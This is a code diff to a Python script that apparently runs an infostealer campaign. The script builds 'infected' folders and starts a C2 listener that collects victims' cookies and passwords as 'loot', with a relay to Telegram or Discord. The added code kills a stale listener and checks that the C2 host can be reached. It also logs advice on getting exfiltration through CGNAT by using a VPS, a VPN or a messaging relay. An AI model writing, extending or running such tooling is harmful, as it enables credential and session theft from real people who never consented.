@@ -49,7 +49,7 @@ What it does:
 
 Press Ctrl+C to stop early.
 """
-import json, os, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse
+import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.request, urllib.parse
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -390,6 +390,41 @@ def build_infected_folder(host_dir, c2_url, persist=False, no_anti_vm=False):
 
 # ------------------------------------------------------------------ listener
 
+def find_port_owner_pid(port):
+    """Return (pid, cmdline) of whatever is LISTENing on port, or (None, None).
+    Linux: ss -ltnp (iproute2, standard on Arch). Windows: netstat -ano + PowerShell."""
+    try:
+        if sys.platform == "win32":
+            out = subprocess.run(["netstat", "-ano", "-p", "tcp"],
+                                 capture_output=True, text=True, timeout=10).stdout
+            for line in out.splitlines():
+                parts = line.split()
+                #  TCP    0.0.0.0:9090    0.0.0.0:0    LISTENING    1234
+                if len(parts) >= 5 and parts[3].upper() == "LISTENING" and parts[1].endswith(":%d" % port):
+                    pid = int(parts[4])
+                    cl = subprocess.run(["powershell", "-NoProfile", "-Command",
+                                         "(Get-CimInstance Win32_Process -Filter 'ProcessId=%d').CommandLine" % pid],
+                                        capture_output=True, text=True, timeout=10)
+                    return pid, (cl.stdout or "").strip()
+        else:
+            out = subprocess.run(["ss", "-ltnp"], capture_output=True, text=True, timeout=10).stdout
+            for line in out.splitlines():
+                if ":%d " % port not in line and not line.rstrip().endswith(":%d" % port):
+                    continue
+                m = re.search(r'pid=(\d+)', line)
+                if not m:
+                    continue
+                pid = int(m.group(1))
+                try:
+                    with open("/proc/%d/cmdline" % pid, "rb") as f:
+                        cl = f.read().replace(b"\x00", b" ").decode("utf-8", "replace").strip()
+                except Exception:
+                    cl = ""
+                return pid, cl
+    except Exception:
+        pass
+    return None, None
+
 def start_listener(port, telegram=None, discord=None):
     """Start listen.py in background. Returns the process handle.
     If telegram or discord are provided, listen.py relays received cookies to them.
@@ -403,8 +438,24 @@ def start_listener(port, telegram=None, discord=None):
         probe.bind(("0.0.0.0", port))
         probe.close()
     except OSError:
-        log("[!] port %d already in use -- kill the old listener or pass --port / --find-port" % port)
-        return None
+        # port busy: if it is OUR zombie listener from a previous crashed run,
+        # kill it and continue; if it belongs to someone else, refuse cleanly
+        pid, cl = find_port_owner_pid(port)
+        if pid and cl and "listen.py" in cl:
+            log("[!] port %d held by our old listener (PID=%d) -- killing it and restarting" % (port, pid))
+            try:
+                if sys.platform == "win32":
+                    subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True, timeout=10)
+                else:
+                    os.kill(pid, 9)  # SIGKILL
+                time.sleep(0.7)
+            except Exception:
+                pass
+        else:
+            if pid:
+                log("[!] port %d is held by another process (PID=%d: %s)" % (port, pid, (cl or "?")[:90]))
+            log("[!] kill it or pass --port / --find-port")
+            return None
     # clean old loot (both old and new filenames)
     for f in ["all_cookies.json", "all_cookies.txt",
               "passwords.json", "passwords.txt",
@@ -435,6 +486,24 @@ def start_listener(port, telegram=None, discord=None):
         return None
     log("[+] listener on port %d (PID=%d)" % (port, proc.pid))
     return proc
+
+def check_c2_reachable(c2_url, timeout=4):
+    """Best-effort TCP connect to the C2 host:port. Honest about its limits:
+    from inside the LAN a failure can be a missing port-forward, a local
+    firewall, OR a failed NAT hairpin -- it cannot tell those apart. A success
+    only proves the port answers on this network path."""
+    try:
+        u = urllib.parse.urlparse(c2_url)
+        host, port = u.hostname, (u.port or 80)
+        if host in ("127.0.0.1", "localhost"):
+            return True, "local"
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((host, port))
+        s.close()
+        return True, "reachable"
+    except Exception as ex:
+        return False, str(ex)
 
 def wait_for_cookies(timeout=300):
     """Wait for loot/all_cookies.json to appear in loot/. Print summary when done."""
@@ -1337,6 +1406,18 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
     if not listener:
         log("[-] could not start listener")
         return
+    # 3.5 is the C2 actually answering on that address? (best-effort, see docstring)
+    ok, info = check_c2_reachable(c2_url)
+    if not ok:
+        log("[!] C2 %s is NOT reachable from here (%s)" % (c2_url, info))
+        log("    likely causes: no port-forward on the router, a local firewall blocking")
+        log("    the port, or the ISP uses CGNAT (very common on Brazilian residential")
+        log("    lines -- port-forward is impossible there). Options that work anyway:")
+        log("      * Telegram/Discord relay (--telegram / --discord): HTTPS outbound, no forward")
+        log("      * a cheap VPS or a VPN (Tailscale/WireGuard) as the C2 host")
+        log("      * keep the victim on your LAN and use the LAN IP C2")
+    else:
+        log("[+] C2 check: %s answers on %s" % (c2_url, info))
 
     # 4. infect
     log("\n[4/5] infecting...")
